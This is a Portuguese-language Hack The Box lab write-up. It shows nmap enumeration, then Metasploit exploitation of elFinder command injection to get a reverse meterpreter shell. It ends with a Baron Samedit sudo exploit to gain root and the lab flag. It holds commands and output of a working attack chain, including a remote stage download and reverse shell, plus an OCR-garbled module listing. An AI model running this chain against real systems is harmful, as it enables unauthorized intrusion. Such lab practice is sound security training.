## Tags
#Hackthebox 

## Alvo
- O alvo é um host rodando um servidor web vulnerável e foi pedido algumas questões para a gente

## Objetivo
- O alvo tem um aplicativo web específico em execução que podemos encontrar olhando para o código-fonte HTML. Qual é o nome dessa aplicação web? -> elFinder
-  Encontre a exploração existente em MSF e use-a para obter um shell no alvo. Qual é o nome de usuário do usuário com o qual você obteve um shell? -> www-data
-  O sistema de destino tem uma versão antiga do Sudo em execução. Encontre a exploração relevante e obtenha acesso root ao sistema de destino. Encontre o arquivo flag.txt e envie o conteúdo como resposta. -> HTB{5e55ion5_4r3_sw33t}

## Ferramentas e scripts utilizados
- nmap
- msfconsole

## Resultados obtidos
```
sudo nmap -sS 10.129.41.189     
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 22:02 -0400
Nmap scan report for 10.129.41.189
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sC -sV -p 80 10.129.41.189
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 22:02 -0400
Nmap scan report for 10.129.41.189
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: elFinder 2.1.x source version with PHP connector
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```
Executei o nmap para enumerar o host alvo e vi que havia uma porta 80 rodando o servidor web e abaixo vemos com o uso de -sV e -sC que a aplicação chamada elFinder , com isso respondi a primeira pergunta e utilizei esse nome para procurar no msfconsole.

--- 
```
msf > search elFinder

Matching Modules
================

   #  Full Name                                                          Disclosure Date  Rank       Check  Name
   -  ---------                                                          ---------------  ----       -----  ----
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
```
Selecionei o 3 com use 3.
```
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(linux/http/elfinder_archive_cmd_injection) > options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
                                         xies: http, sapni, socks4, socks5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST                     no        The local host to listen on and use for incoming connections
   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVPORT  8080             yes       The local port to listen on


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST ip
LHOST => ip
msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.41.189
RHOST => 10.129.41.189
msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
```
Com isso setei as opções e executei o exploit .
```
[*] Started reverse TCP handler on 10.10.17.37:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file QBhzVoyDP.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive myuHxIJD.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.17.37:8080/Ljslik5Y2CV
[*] Client 10.129.41.189 (Wget/1.20.3 (linux-gnu)) requested /Ljslik5Y2CV
[*] Sending payload to 10.129.41.189 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  51.79% done (58/112 bytes)
[*] Command Stager progress -  71.43% done (80/112 bytes)
[*] Sending stage (1079144 bytes) to 10.129.41.189
[+] Deleted QBhzVoyDP.txt
[+] Deleted myuHxIJD.zip
[*] Meterpreter session 1 opened (10.10.17.37:4444 -> 10.129.41.189:46552) at 2026-09-01 22:06:25 -0400
[*] Command Stager progress -  83.04% done (93/112 bytes)
[*] Command Stager progress - 100.00% done (112/112 bytes)
[*] Server stopped.

meterpreter > shell
Process 1449 created.
Channel 1 created.
whoami
www-data

```
Aqui o shell foi gerado com o sucesso do exploit e payload enviado , nisso vi que o usuário é o www-data e assim respondi a segunda pergunta . A seção falou que o sudo nesse servidor está com versao antiga e nisso usei o comando man para ver a versão do sudo e achei a 1.8.31 nisso procurei no msfconsole e achei o exploit e configurei para utilizar na sessão correspondente.
```
# Full Name Disclosure Date Rank Check Name
@ exploit/linux/local/sudo_baron_samedit
Heap-Based Buffer Overflow
target: Automatic
2021-01-26 excellent Yes Sudo
2 target: Ubuntu 20.04 x64 (sudo v1.8
3 _ target: Ubuntu 20.04 x64 (Sudo vi.8.31, Libc v2.31) - alternative
4 _ target: Ubuntu 19.04 x64 (Sudo v1.8.27, Libc v2.29)
5 _ target: Ubuntu 18.04 x64 (Sudo v1.8.21, Libc v2.27)
6 _ target: Ubuntu 18.04 x64 (Sudo v1.8.21, Libc v2.27) - alternative
7 _ target: Ubuntu 16.04 x64 (Sudo v1.8.16, Libc v2.23)
8 _ target: Ubuntu 14.04 x64 (Sudo v1.8.9p5, Libc v2.19)
9 _ target: Debian 10 x64 (Sudo v1.8.27, Libc v2.28)
_ target: Debian 10 x64 (Sudo v1.8.27, libc v2.28) - alternative
11 _ target: CentOS 8 x64 (Sudo v1.8.25p1, Libc v2.28)
12 _ target: CentOS 7 x64 (Sudo v1.8.23, lLibc v2.17)
target: CentOS 7 x64 (Udo v1.8.23, lLibc v2.17) - alternative
14 _ target: Fedora 27 x64 (Sudo v1.8.21p2, Libc v2.26)
se) _ target: Fedora 26 x64 (Udo v1.8.20p2, Libc v2.25)
16 _ target: Fedora 25 x64 (Sudo v1.8.18, Libc v2.24)
17 _ target: Fedora 24 x64 (Udo v1.8.16, Libc v2.23)
18 _ target: Fedora 23 x64 (Sudo v1.8.14p3, Libc v2.22)

target: Manual
```
Minha maquina virtual travou e gerei isso por print e extração de texto , com isso usei o target 2 que está bugado a mensagem , setei as opções que no caso era LHOST e SESSIONS que setei o id da sessao que peguei como www-data e nisso foi executado corretamente e gerado um meterpreter que digitei shell , whoami e vi que era root , dei cd /root e dei cat em flag.txt -> HTB{5e55ion5_4r3_sw33t}
## Considerações
Sem considerações nesse mini lab devido ser muito simples e não ter gerado nenhuma dor de cabeça , confusão , dúvida ou algo do tipo.

